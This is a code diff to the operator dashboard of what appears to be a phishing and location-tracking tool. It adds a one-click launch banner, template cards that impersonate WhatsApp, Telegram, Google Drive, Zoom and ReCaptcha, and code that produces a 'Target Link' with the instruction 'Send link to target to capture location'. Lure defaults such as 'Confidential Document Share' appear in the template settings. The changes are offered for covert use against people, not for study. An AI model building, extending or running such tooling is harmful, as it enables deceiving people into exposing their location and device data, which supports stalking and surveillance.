@@ -255,6 +255,57 @@
   <!-- Main Content -->
   <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6 flex-1 w-full">
     
+    <!-- Quick Tracker Banner (Instant 1-Click Launch & Direct Copy) -->
+    <div id="quickTrackerBanner" class="p-4 sm:p-5 rounded-2xl border transition-all duration-300 flex flex-col md:flex-row items-center justify-between gap-4 bg-gradient-to-r from-surface-900 via-surface-900 to-surface-950 border-slate-800 shadow-xl">
+      <!-- Left: Status & Description -->
+      <div class="flex items-center space-x-3.5 w-full md:w-auto">
+        <div id="bannerIconWrapper" class="w-11 h-11 rounded-xl flex items-center justify-center shrink-0 bg-slate-800 text-slate-400 border border-slate-700">
+          <i id="bannerIcon" data-lucide="radio" class="w-5 h-5"></i>
+        </div>
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="font-bold text-sm text-slate-100">Location Tracker Engine</span>
+            <span id="bannerStatusPill" class="text-[10px] font-mono font-bold px-2 py-0.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700">OFFLINE</span>
+          </div>
+          <p id="bannerStatusSubtext" class="text-xs text-slate-400 mt-0.5">Click 1-Click Launch to start capturing location and device telemetry.</p>
+        </div>
+      </div>
+
+      <!-- Right: Target Link & Action Buttons -->
+      <div class="flex items-center flex-wrap gap-2 w-full md:w-auto justify-start md:justify-end">
+        <!-- Live Link Box (visible when running) -->
+        <div id="bannerLinkBox" class="hidden flex items-center bg-surface-950 border border-cyan-500/40 rounded-xl px-3 py-1.5 gap-2 max-w-full">
+          <span class="text-[10px] text-slate-500 hidden sm:inline">Target Link:</span>
+          <a id="bannerTargetUrl" href="#" target="_blank" class="font-mono text-cyan-400 text-xs font-bold truncate max-w-[220px] sm:max-w-[320px] hover:underline">...</a>
+          <button id="bannerCopyBtn" onclick="copyTargetLink()" title="Copy Link" class="p-1.5 rounded-lg bg-surface-800 hover:bg-surface-700 text-slate-300 transition shrink-0 flex items-center space-x-1">
+            <i id="bannerCopyIcon" data-lucide="copy" class="w-3.5 h-3.5"></i>
+            <span id="bannerCopyText" class="text-[10px] hidden sm:inline font-semibold">Copy</span>
+          </button>
+          <a id="bannerExtBtn" href="#" target="_blank" title="Test in new tab" class="p-1.5 rounded-lg bg-cyan-600/80 hover:bg-cyan-500 text-white transition shrink-0">
+            <i data-lucide="external-link" class="w-3.5 h-3.5"></i>
+          </a>
+        </div>
+
+        <!-- 1-Click Launch Button (when offline) -->
+        <button id="bannerQuickLaunchBtn" onclick="quickLaunchDefaultTracker()" class="py-2.5 px-5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl text-xs transition flex items-center space-x-2 shadow-lg shadow-emerald-600/30">
+          <i data-lucide="play" class="w-4 h-4"></i>
+          <span id="bannerLaunchBtnText">🚀 1-Click Launch</span>
+        </button>
+
+        <!-- Stop Button (when online) -->
+        <button id="bannerStopBtn" onclick="stopTrackerFromUI()" class="hidden py-2.5 px-4 bg-rose-600/90 hover:bg-rose-500 text-white font-bold rounded-xl text-xs transition flex items-center space-x-1.5 shadow-md shadow-rose-600/20">
+          <i data-lucide="square" class="w-3.5 h-3.5"></i>
+          <span>Stop</span>
+        </button>
+
+        <!-- Configure / Change Settings Button -->
+        <button onclick="openTrackerModal()" class="py-2.5 px-4 bg-surface-800 hover:bg-surface-750 text-slate-200 border border-slate-700 rounded-xl text-xs font-semibold transition flex items-center space-x-1.5 shadow-sm">
+          <i data-lucide="sliders" class="w-3.5 h-3.5 text-cyan-400"></i>
+          <span>Change Template / Settings</span>
+        </button>
+      </div>
+    </div>
+
     <!-- KPI Metrics (Clickable Quick Filters) -->
     <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
       
@@ -640,10 +691,71 @@
           </h4>
 
           <div class="space-y-3 bg-surface-950 p-4 rounded-2xl border border-slate-800">
-            <!-- Template Selection -->
+            <!-- Visual Template Selection Cards -->
             <div>
-              <label class="block text-slate-300 font-medium mb-1">Select Recon Template</label>
-              <select id="modalTemplateSelect" onchange="onTemplateChange()" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500">
+              <div class="flex items-center justify-between mb-2">
+                <label class="block text-slate-300 font-medium">Select Template (Click one)</label>
+                <span class="text-[10px] text-emerald-400 font-mono font-bold bg-emerald-500/10 px-2 py-0.5 rounded-full border border-emerald-500/20">1-Click Ready</span>
+              </div>
+              <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-2">
+                <button type="button" onclick="selectTemplateCard(0)" id="tplCard-0" class="template-card p-2.5 rounded-xl border border-cyan-500 bg-cyan-500/10 text-left transition flex flex-col justify-between hover:border-cyan-400 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">🌦️</span>
+                    <span class="font-bold text-[11px] text-slate-100 truncate">NearYou</span>
+                  </div>
+                  <span class="text-[9px] text-emerald-400 font-bold">Recommended</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(1)" id="tplCard-1" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">📁</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">GDrive</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">File Share</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(2)" id="tplCard-2" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">💬</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">WhatsApp</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">Group Chat</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(3)" id="tplCard-3" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">🔗</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">WA Redirect</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">Auto Forward</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(4)" id="tplCard-4" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">✈️</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">Telegram</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">Channel Invite</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(5)" id="tplCard-5" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">📹</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">Zoom</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">Video Call</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(6)" id="tplCard-6" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">🛡️</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">ReCaptcha</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">Human Verify</span>
+                </button>
+                <button type="button" onclick="selectTemplateCard(7)" id="tplCard-7" class="template-card p-2.5 rounded-xl border border-slate-750 bg-surface-900 text-left transition flex flex-col justify-between hover:border-slate-600 cursor-pointer">
+                  <div class="flex items-center space-x-1.5 mb-1">
+                    <span class="text-base">🌐</span>
+                    <span class="font-bold text-[11px] text-slate-200 truncate">Social OG</span>
+                  </div>
+                  <span class="text-[9px] text-slate-500">Custom Card</span>
+                </button>
+              </div>
+              <select id="modalTemplateSelect" onchange="onTemplateChange()" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500 hidden">
                 <option value="0" selected>🌦️ [0] NearYou - Weather & Nearby Places (Recommended)</option>
                 <option value="1">📁 [1] Google Drive - File Download Share</option>
                 <option value="2">💬 [2] WhatsApp - Group Chat Invite</option>
@@ -706,18 +818,6 @@
           </div>
         </div>
 
-        <!-- Start / Stop Action Buttons -->
-        <div class="flex items-center space-x-2 pt-1">
-          <button id="modalStartBtn" onclick="startTrackerFromUI()" class="flex-1 py-2.5 px-4 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-2 shadow-lg shadow-emerald-600/20">
-            <i data-lucide="play" class="w-4 h-4"></i>
-            <span id="modalStartBtnText">Start / Apply Configuration</span>
-          </button>
-          <button id="modalStopBtn" onclick="stopTrackerFromUI()" class="py-2.5 px-4 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-1.5 shadow-lg shadow-rose-600/20">
-            <i data-lucide="square" class="w-4 h-4"></i>
-            <span>Stop Tracker</span>
-          </button>
-        </div>
-
         <!-- Console Runtime Output -->
         <div class="space-y-1.5 pt-1">
           <div class="flex items-center justify-between text-slate-500 text-[10px] font-mono">
@@ -734,18 +834,28 @@
               </button>
             </div>
           </div>
-          <div id="modalTerminalBox" class="bg-surface-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-slate-400 max-h-40 overflow-y-auto space-y-0.5">
+          <div id="modalTerminalBox" class="bg-surface-950 p-3 rounded-xl border border-slate-800 font-mono text-[11px] text-slate-400 max-h-36 overflow-y-auto space-y-0.5">
             <p class="text-slate-500">Service logs will appear here...</p>
           </div>
         </div>
 
       </div>
 
-      <!-- Modal Footer -->
-      <div class="p-4 border-t border-slate-800 bg-surface-950/60 flex items-center justify-end shrink-0">
-        <button onclick="closeTrackerModal()" class="px-4 py-2 rounded-xl text-xs font-semibold bg-surface-800 hover:bg-surface-700 text-slate-200 transition">
-          Close Manager
+      <!-- Modal Sticky Footer (Always Visible Without Scrolling) -->
+      <div class="p-4 border-t border-slate-800 bg-surface-950 flex items-center justify-between gap-3 shrink-0">
+        <button onclick="closeTrackerModal()" class="px-4 py-2.5 rounded-xl text-xs font-semibold bg-surface-800 hover:bg-surface-700 text-slate-300 transition">
+          Close
         </button>
+        <div class="flex items-center space-x-2">
+          <button id="modalStopBtn" onclick="stopTrackerFromUI()" class="py-2.5 px-4 bg-rose-600/90 hover:bg-rose-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-1.5 shadow-md shadow-rose-600/20">
+            <i data-lucide="square" class="w-3.5 h-3.5"></i>
+            <span>Stop Tracker</span>
+          </button>
+          <button id="modalStartBtn" onclick="startTrackerFromUI()" class="py-2.5 px-5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl text-xs transition flex items-center justify-center space-x-2 shadow-lg shadow-emerald-600/30">
+            <i data-lucide="play" class="w-4 h-4"></i>
+            <span id="modalStartBtnText">🚀 Launch Tracker</span>
+          </button>
+        </div>
       </div>
 
     </div>
@@ -2005,13 +2115,82 @@
       document.getElementById('trackerModal').classList.add('hidden');
     };
 
-    window.copyTargetLink = function() {
-      const port = trackerState.port || 8080;
+    // Intelligent Target URL resolver (maps admin subdomain to tracker domain)
+    window.getTargetUrl = function() {
       const host = window.location.hostname || 'localhost';
       const proto = window.location.protocol || 'http:';
-      const portPart = (proto === 'https:' && !window.location.port) || port == 80 || port == 443 ? '' : `:${port}`;
-      const link = `${proto}//${host}${portPart}`;
+      
+      // If browsing via admin.seeker.riocut.com or admin-seeker.riocut.com
+      if (host.startsWith('admin.')) {
+        return `${proto}//${host.replace('admin.', '')}`;
+      }
+      if (host.startsWith('admin-')) {
+        return `${proto}//${host.replace('admin-', '')}`;
+      }
+      
+      // Standard host & port calculation
+      const port = (trackerState && trackerState.port) || 8080;
+      if ((proto === 'https:' && !window.location.port) || port == 80 || port == 443) {
+        return `${proto}//${host}`;
+      }
+      return `${proto}//${host}:${port}`;
+    };
+
+    window.copyTargetLink = function() {
+      const link = getTargetUrl();
       copyText(link, 'Target URL');
+      const copyTextSpan = document.getElementById('bannerCopyText');
+      if (copyTextSpan) {
+        copyTextSpan.textContent = 'Copied!';
+        setTimeout(() => { copyTextSpan.textContent = 'Copy'; }, 2000);
+      }
+    };
+
+    window.selectTemplateCard = function(id) {
+      document.getElementById('modalTemplateSelect').value = id;
+      document.querySelectorAll('.template-card').forEach(c => {
+        c.classList.remove('border-cyan-500', 'bg-cyan-500/10');
+        c.classList.add('border-slate-750', 'bg-surface-900');
+      });
+      const active = document.getElementById(`tplCard-${id}`);
+      if (active) {
+        active.classList.add('border-cyan-500', 'bg-cyan-500/10');
+        active.classList.remove('border-slate-750', 'bg-surface-900');
+      }
+      onTemplateChange();
+    };
+
+    window.quickLaunchDefaultTracker = async function() {
+      const btn = document.getElementById('bannerQuickLaunchBtn');
+      const txt = document.getElementById('bannerLaunchBtnText');
+      if (btn) btn.disabled = true;
+      if (txt) txt.textContent = '🚀 Launching...';
+
+      try {
+        const res = await fetch('/api/tracker/start', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            template_id: 0,
+            port: 8080,
+            debug_http: true
+          })
+        });
+        const data = await res.json();
+        if (data.status === 'success') {
+          showToast('Tracker launched! NearYou template is LIVE', 'success');
+          trackerState = data;
+          updateTrackerUI(data);
+          fetchTrackerLogs();
+        } else {
+          showToast(`Launch failed: ${data.message}`, 'error');
+        }
+      } catch (err) {
+        showToast('Failed to connect to tracker supervisor', 'error');
+      } finally {
+        if (btn) btn.disabled = false;
+        if (txt) txt.textContent = '🚀 1-Click Launch';
+      }
     };
 
     // Modal click out to close
@@ -2206,6 +2385,17 @@
       const container = document.getElementById('dynamicTemplateInputs');
       const activeCfg = cfg || (trackerState && trackerState.config) || {};
 
+      // Sync active visual card styling
+      document.querySelectorAll('.template-card').forEach(c => {
+        c.classList.remove('border-cyan-500', 'bg-cyan-500/10');
+        c.classList.add('border-slate-750', 'bg-surface-900');
+      });
+      const activeCard = document.getElementById(`tplCard-${val}`);
+      if (activeCard) {
+        activeCard.classList.add('border-cyan-500', 'bg-cyan-500/10');
+        activeCard.classList.remove('border-slate-750', 'bg-surface-900');
+      }
+
       let html = '';
       if (val === 1) { // GDrive
         const redirect = escapeHtml(activeCfg.redirect || 'https://drive.google.com');
@@ -2217,7 +2407,7 @@
         `;
       } else if (val === 2) { // WhatsApp
         const title = escapeHtml(activeCfg.title || 'My Family & Friends');
-        const image = escapeHtml(activeCfg.image || '');
+        const image = escapeHtml(activeCfg.image || 'template/whatsapp/images/ZIvBTrQd9nP.png');
         html = `
           <div>
             <label class="block text-slate-300 font-medium mb-1">WhatsApp Group Title</label>
@@ -2230,7 +2420,7 @@
         `;
       } else if (val === 3) { // WhatsApp Redirect
         const title = escapeHtml(activeCfg.title || 'Project Updates & Group');
-        const image = escapeHtml(activeCfg.image || '');
+        const image = escapeHtml(activeCfg.image || 'template/whatsapp_redirect/images/ZIvBTrQd9nP.png');
         const redirect = escapeHtml(activeCfg.redirect || 'https://chat.whatsapp.com/invite');
         html = `
           <div>
@@ -2238,7 +2428,7 @@
             <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
           </div>
           <div>
-            <label class="block text-slate-300 font-medium mb-1">Group Icon URL</label>
+            <label class="block text-slate-300 font-medium mb-1">Group Icon URL (or Image Path)</label>
             <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/icon.png" />
           </div>
           <div>
@@ -2248,7 +2438,7 @@
         `;
       } else if (val === 4) { // Telegram
         const title = escapeHtml(activeCfg.title || 'News & Crypto Signals');
-        const image = escapeHtml(activeCfg.image || '');
+        const image = escapeHtml(activeCfg.image || 'template/telegram/images/Arrow_1x.png');
         const desc = escapeHtml(activeCfg.desc || 'Join the official group for updates.');
         const memNum = escapeHtml(activeCfg.mem_num || '1,420');
         const onlineNum = escapeHtml(activeCfg.online_num || '86');
@@ -2258,7 +2448,7 @@
             <input type="text" id="paramTitle" value="${title}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" />
           </div>
           <div>
-            <label class="block text-slate-300 font-medium mb-1">Channel Avatar Image URL</label>
+            <label class="block text-slate-300 font-medium mb-1">Channel Avatar Image URL (or Image Path)</label>
             <input type="text" id="paramImage" value="${image}" class="w-full bg-surface-900 border border-slate-700 rounded-xl px-3 py-2 text-slate-200 text-xs focus:outline-none focus:border-cyan-500" placeholder="https://example.com/avatar.jpg" />
           </div>
           <div>
@@ -2301,7 +2491,7 @@
         const sitename = escapeHtml(activeCfg.sitename || 'Cloud Storage');
         const title = escapeHtml(activeCfg.title || 'Confidential Document Share');
         const desc = escapeHtml(activeCfg.desc || 'Click to view the attached file.');
-        const image = escapeHtml(activeCfg.image || '');
+        const image = escapeHtml(activeCfg.image || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600');
         const redirect = escapeHtml(activeCfg.redirect || 'https://google.com');
         html = `
           <div class="grid grid-cols-2 gap-2">
@@ -2395,11 +2585,22 @@
       const targetExt = document.getElementById('modalTargetUrlExternal');
       const termBox = document.getElementById('modalTerminalBox');
 
-      const host = window.location.hostname || 'localhost';
+      const targetUrl = getTargetUrl();
       const port = status.port || 8080;
-      const proto = window.location.protocol || 'http:';
-      const portPart = (proto === 'https:' && !window.location.port) || port == 80 || port == 443 ? '' : `:${port}`;
-      const url = `${proto}//${host}${portPart}`;
+
+      // Banner elements
+      const bannerStatusPill = document.getElementById('bannerStatusPill');
+      const bannerStatusSubtext = document.getElementById('bannerStatusSubtext');
+      const bannerLinkBox = document.getElementById('bannerLinkBox');
+      const bannerTargetUrl = document.getElementById('bannerTargetUrl');
+      const bannerExtBtn = document.getElementById('bannerExtBtn');
+      const bannerQuickLaunchBtn = document.getElementById('bannerQuickLaunchBtn');
+      const bannerStopBtn = document.getElementById('bannerStopBtn');
+      const bannerIconWrapper = document.getElementById('bannerIconWrapper');
+
+      // Modal sticky footer buttons
+      const modalStartBtnText = document.getElementById('modalStartBtnText');
+      const modalStopBtn = document.getElementById('modalStopBtn');
 
       // Populate form fields on first load from saved config
       if (!hasPopulatedFormOnce && status.config) {
@@ -2431,25 +2632,67 @@
       }
 
       if (status.running) {
+        // Top Nav Badge
         dot.className = 'w-2 h-2 rounded-full bg-emerald-400 animate-pulse';
         text.textContent = `Tracker: LIVE (${status.template_name || 'NearYou'} :${port})`;
         badge.className = 'flex items-center space-x-1.5 px-2.5 py-1 rounded-lg text-xs font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20';
 
+        // Top Quick Action Banner
+        if (bannerStatusPill) {
+          bannerStatusPill.className = 'text-[10px] font-mono font-bold px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 animate-pulse';
+          bannerStatusPill.textContent = 'ONLINE (ACTIVE)';
+        }
+        if (bannerStatusSubtext) {
+          bannerStatusSubtext.textContent = `Target Link active via ${status.template_name || 'NearYou'} template on port ${port}. Send link to target to capture location.`;
+        }
+        if (bannerLinkBox) bannerLinkBox.classList.remove('hidden');
+        if (bannerTargetUrl) {
+          bannerTargetUrl.textContent = targetUrl;
+          bannerTargetUrl.href = targetUrl;
+        }
+        if (bannerExtBtn) bannerExtBtn.href = targetUrl;
+        if (bannerQuickLaunchBtn) bannerQuickLaunchBtn.classList.add('hidden');
+        if (bannerStopBtn) bannerStopBtn.classList.remove('hidden');
+        if (bannerIconWrapper) {
+          bannerIconWrapper.className = 'w-11 h-11 rounded-xl flex items-center justify-center shrink-0 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30';
+        }
+
+        // Modal State
         modalDot.className = 'w-2 h-2 rounded-full bg-emerald-400 animate-pulse';
         modalPill.className = 'flex items-center space-x-1.5 px-2.5 py-0.5 rounded-full font-mono text-[11px] font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30';
         modalStatus.textContent = 'ONLINE';
         activeTemplate.textContent = status.template_name || 'NearYou';
         activePort.textContent = `:${port}`;
 
-        targetLink.textContent = url;
-        targetLink.href = url;
-        targetExt.href = url;
+        targetLink.textContent = targetUrl;
+        targetLink.href = targetUrl;
+        targetExt.href = targetUrl;
         document.getElementById('modalActiveLinkBox').classList.remove('opacity-50');
+
+        if (modalStopBtn) modalStopBtn.classList.remove('hidden');
+        if (modalStartBtnText) modalStartBtnText.textContent = '🔄 Restart / Apply';
       } else {
+        // Top Nav Badge
         dot.className = 'w-2 h-2 rounded-full bg-slate-500';
         text.textContent = 'Tracker: OFFLINE';
         badge.className = 'flex items-center space-x-1.5 px-2.5 py-1 rounded-lg text-xs font-semibold bg-slate-800 text-slate-400 border border-slate-700';
 
+        // Top Quick Action Banner
+        if (bannerStatusPill) {
+          bannerStatusPill.className = 'text-[10px] font-mono font-bold px-2 py-0.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700';
+          bannerStatusPill.textContent = 'OFFLINE';
+        }
+        if (bannerStatusSubtext) {
+          bannerStatusSubtext.textContent = 'Click 🚀 1-Click Launch to start capturing location and device telemetry.';
+        }
+        if (bannerLinkBox) bannerLinkBox.classList.add('hidden');
+        if (bannerQuickLaunchBtn) bannerQuickLaunchBtn.classList.remove('hidden');
+        if (bannerStopBtn) bannerStopBtn.classList.add('hidden');
+        if (bannerIconWrapper) {
+          bannerIconWrapper.className = 'w-11 h-11 rounded-xl flex items-center justify-center shrink-0 bg-slate-800 text-slate-400 border border-slate-700';
+        }
+
+        // Modal State
         modalDot.className = 'w-2 h-2 rounded-full bg-slate-500';
         modalPill.className = 'flex items-center space-x-1.5 px-2.5 py-0.5 rounded-full font-mono text-[11px] font-bold bg-slate-800 text-slate-400 border border-slate-700';
         modalStatus.textContent = 'OFFLINE';
@@ -2460,6 +2703,9 @@
         targetLink.removeAttribute('href');
         targetExt.removeAttribute('href');
         document.getElementById('modalActiveLinkBox').classList.add('opacity-50');
+
+        if (modalStopBtn) modalStopBtn.classList.add('hidden');
+        if (modalStartBtnText) modalStartBtnText.textContent = '🚀 Launch Tracker';
       }
 
       if (status.logs && status.logs.length > 0) {
